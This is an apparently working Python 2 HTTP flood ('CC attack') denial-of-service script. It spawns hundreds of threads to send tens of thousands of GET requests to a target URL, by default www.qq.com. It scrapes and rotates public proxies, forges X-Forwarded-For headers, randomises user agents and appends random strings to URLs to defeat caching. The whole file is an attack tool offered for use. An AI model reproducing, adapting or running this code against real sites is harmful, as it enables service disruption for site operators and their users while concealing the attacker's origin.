#!/usr/bin/env python
# -*- coding: utf-8 -*-

__author__ = "pandaychen"

import threadpool
import socket
import requests
import time
import random
import argparse
import sys
import os
import Queue
import urllib2
import signal
import threading
from bs4 import BeautifulSoup
import traceback

from proxy_get import *
from proxy_check import  *
from utils import *

#thread function
def cc_attack(*argc,**kwds):

    #print argc
    #print kwds
    #para_dict={'t_ua':"1",'t_useproxy':'1','t_proxy':'1','t_xforwarded':1,'t_attack_url':i,'t_timeout':1,'t_cookies':1}

    t_ua=kwds['t_ua']
    t_proxycontent=kwds['t_useproxy']
    t_proxy=kwds['t_proxy']
    t_xforwarded=kwds['t_xforwarded']
    t_attack_url=kwds['t_attack_url']
    t_timeout=kwds['t_timeout']
    t_cookiesdict=kwds['t_cookies']

    USER_AGENT_LIST = [
                'Mozilla/5.0 (Windows; U; Windows NT 5.1; it; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11',
                'Opera/9.25 (Windows NT 5.1; U; en)',
                'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)',
                'Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.5 (like Gecko) (Kubuntu)',
                'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.12) Gecko/20070731 Ubuntu/dapper-security Firefox/1.5.0.12',
                'Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 GNUTLS/1.2.9'
            ]

    COOKIES = {
        'ECS_ID':'0205c1cfc20ba229145e2c6cddc76e300c3b1636',\
        'ECS[visit]':'211'\
    }

    if not t_ua:
        t_ua = random.choice(USER_AGENT_LIST)
    if not t_cookiesdict:
        t_cookies=COOKIES
    headers={}

    #why????
    #t_proxycontent = t_proxycontent['http'].split("//")[1].split(':')[0]
    if t_xforwarded == 1:
        headers={   \
                'User-Agent':t_ua,\
                'Range':'bytes=0-1',\
                'X-Forwarded-For':t_proxycontent,\
                }
    else:
         headers={   \
                'User-Agent':t_ua,\
                'Range':'bytes=0-1',\
                #'X-Forwarded-For':t_xforwarded,\
                }

    if not t_proxy:
        #r = requests.head(random.choice(self.url), timeout=self.timeout, cookies=self.cookie, headers=headers)
        #r = requests.get('http://sz.to8to.com', timeout=self.timeout, cookies=self.cookie, headers=headers,proxies=random.choice(self.proxy))
        r = requests.get(t_attack_url,timeout=3, cookies=t_cookiesdict, headers=headers)
        #r = requests.head(random.choice(self.url), timeout=self.timeout, cookies=self.cookie, headers=headers, proxies=random.choice(self.proxy))
        if not r:
            pass
        else:
            if r.status_code == 200:
                return (1,t_proxycontent)
            elif r.status_code == 302:
                pass
            else:
                pass
    else:
        r = requests.get(t_attack_url,timeout=3, cookies=t_cookiesdict, headers=headers,proxies=t_proxycontent)
        #requests.post('http://203.195.149.35/user.php', timeout=self.timeout, headers=headers, cookies=self.cookie, data={'msg_type':'0', 'msg_title':'hello', 'msg_content':'hello', 'act':'act_add_message'})
        #r = requests.head(random.choice(self.url), timeout=self.timeout, cookies=self.cookie, headers=headers)
        if not r:
            pass
        else:
            if r.status_code == 200:
                return (1,t_proxycontent)
            elif r.status_code == 302:
                pass
            else:
                pass

def handler():
    print "press CTRL+C to end...."
    sys.exit(1)

class LogThread(threading.Thread):
    def __init__(self,logQueue,**kwds):
        threading.Thread.__init__(self,**kwds)
        self.logQueue = logQueue
        self.setDaemon(True)

    def run(self):
        pass
        """
        while 1:
            #log = self.logQueue.get(False)
            log = self.logQueue.get()
            if log:
                Logging("test",log)
                pass
            else:
                Logging("test","log thread sleep 1s")
                time.sleep(1)
        """

#封装为一个线程类
class Worker(threading.Thread):    # 处理工作请求
    def __init__(self, workQueue, resultQueue,logQueue, threadid,**kwds):
        threading.Thread.__init__(self, **kwds)
        self.setDaemon(True)
        self.workQueue = workQueue
        self.resultQueue = resultQueue
        self.logQueue = logQueue
        self.threadid = threadid

    def run(self):
        while 1:
            try:
                callable, args, kwds = self.workQueue.get(False)    # get a task
                res = callable(*args, **kwds)
                #strres = "thread:"+ str(self.threadid) + " done,"+"args:"+str(res)

                #self.logQueue.put(strres)
                #self.resultQueue.put(res)    # put result

            except Queue.Empty:
                break

class WorkManagerPool:    # 线程池管理,创建
    def __init__(self, num_of_workers=10):
        self.workQueue = Queue.Queue()    # 请求队列
        self.resultQueue = Queue.Queue()    # 输出结果的队列
        self.logQueue = Queue.Queue()
        self.workers = []
        self._recruitThreads(num_of_workers)

    def _recruitThreads(self, num_of_workers):
        for i in range(num_of_workers):
            worker = Worker(self.workQueue, self.resultQueue,self.logQueue,i)    # 创建工作线程
            worker.setDaemon(True)
            self.workers.append(worker)    # 加入到线程队列

        logthread = LogThread(self.logQueue)
        self.workers.append(logthread)
        resQueue = Queue.Queue()
        url = "http://www.xicidaili.com/nn/"
        proxygetthread = ProxyGet(resQueue,"./conf/proxylist",url,5,"URLLIB2",10)
        proxygetthread.setDaemon(True)
        self.workers.append(proxygetthread)
        proxycheckthread = ProxyCheck(resQueue,"./conf/proxylist","./conf/newproxylist",url,5,"URLLIB2",3)
        proxycheckthread.setDaemon(True)
        self.workers.append(proxycheckthread)



    def start(self):
        for w in self.workers:
            w.start()

    def wait_for_complete(self):
        while len(self.workers):
            worker = self.workers.pop()    # 从池中取出一个线程处理请求
            worker.join()   #can be omit
            if worker.isAlive() and not self.workQueue.empty():
                self.workers.append(worker)    # 重新加入线程池中
        print 'All jobs were complete.'

    def add_job(self, callable, *args, **kwds):
        self.workQueue.put((callable, args, kwds))    # 向工作队列中加入请求

    def get_result(self, *args, **kwds):
        return self.resultQueue.get(*args, **kwds)


if __name__ == '__main__':
    """
    resQueue = Queue.Queue()
    url = "http://www.xicidaili.com/nn/"
    proxy=ProxyGet(resQueue,"./proxylist",url,5,"URLLIB2",3)
    proxy.proxy_get()
    a = None
    if not a:
        print "good"

    r = requests.get('http://51kuailian.com', timeout=3,allow_redirects=False)  #关闭自动跳转功能
    print r.headers
    print r.headers['location']
    print r.status_code
    r.encoding='GBK'
    print r.content
    print(r.text, '\n{}\n'.format('*'*79), r.encoding)
    r.encoding = 'GBK'
    print(r.text, '\n{}\n'.format('*'*79), r.encoding)
    #print r.encoding

    if r.status_code == 302:
        redict=r.headers['location']
        r1 = requests.get(redict, timeout=3,allow_redirects=False)
        print r1.status_code
    #sys.exit(1)
    """

    signal.signal(signal.SIGINT, handler)
    signal.signal(signal.SIGTERM, handler)

    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--timeout', type=float, default=3)
    parser.add_argument('-t', '--threadnum', type=int, default=200)
    parser.add_argument('-p','--proxyenable', type=int, default=0)
    parser.add_argument('-u', '--urlrandomenable',type=int,default=0)
    parser.add_argument('-c', '--attackcount',type=int,default=50000)

    help = "The url to attacking. Default is the one who use sbdayu."
    parser.add_argument('--url', help=help, default='http://www.qq.com')
    parser_args = parser.parse_args()

    start = time.time()
    attack_url = parser_args.url
    total_attack_count=parser_args.attackcount

    resQueue = Queue.Queue()
    url = "http://www.xicidaili.com/nn/"
    proxyget=ProxyGetOnce(resQueue,"./conf/proxylist",url,100,"URLLIB2",10)
    proxyget.proxy_get()

    workermanagepool = WorkManagerPool(parser_args.threadnum)
    #print num_of_threads
    print "thread pool start...."

    urls = []
    for i in range(1,total_attack_count):
        if parser_args.urlrandomenable == 1:
            url = attack_url+RandomStr(4)
        else:
            url = attack_url
        urls.append(url)

    ualist = LoadUserAgentConf()
    proxylist =LoadProxyConf()
    proxylistlen = len(proxylist)
    cookiedict = LoadCookiesConf()

    counter=0
    #generate attack tasks
    for i in urls:
        sigleproxy = proxylist[counter%proxylistlen]
        counter+=1
        para_dict={'t_ua':random.choice(ualist),\
                   't_useproxy':sigleproxy,\
                   't_proxy':parser_args.proxyenable,\
                   't_xforwarded':random.choice([0,1]),\
                   't_attack_url':attack_url,\
                   't_timeout':4,\
                   't_cookies':cookiedict}

        workermanagepool.add_job(cc_attack,counter,**para_dict)

    workermanagepool.start()
    workermanagepool.wait_for_complete()
    print time.time() - start
